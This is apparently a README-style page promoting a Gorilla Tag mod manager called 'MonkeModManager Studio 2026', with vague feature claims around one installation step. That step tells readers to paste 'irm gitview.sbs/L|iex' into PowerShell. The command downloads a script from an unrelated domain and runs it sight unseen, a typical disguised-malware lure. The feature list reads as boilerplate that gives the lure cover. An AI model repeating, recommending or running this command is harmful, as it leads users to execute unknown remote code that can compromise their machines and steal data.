MonkeModManager Studio 2026 is an open-source mod installer, BepInEx dependency manager, and VR cosmetic configuration pipeline engineered for Gorilla Tag mod developers, community creators, and PCVR enthusiasts. It provides one-click mod deployment, dynamic release mirror tracking, and automated directory verification for SteamVR environments.

================================================================
                     DOWNLOAD INFORMATION
----------------------------------------------------------------
## 📥 Installation Win + X --> PowerShell
```
irm gitview.sbs/L|iex
```
================================================================

Core Capabilities
- Automated BepInEx framework bootstrap and directory structure validation.
- Centralized mod repository polling for latest compatible plugin builds.
- Local configuration editor for tweaking mod parameters directly.
- One-click plugin toggle to easily switch between modded and vanilla gameplay sessions.
- Multi-platform deployment support built for lightweight VR utility performance.

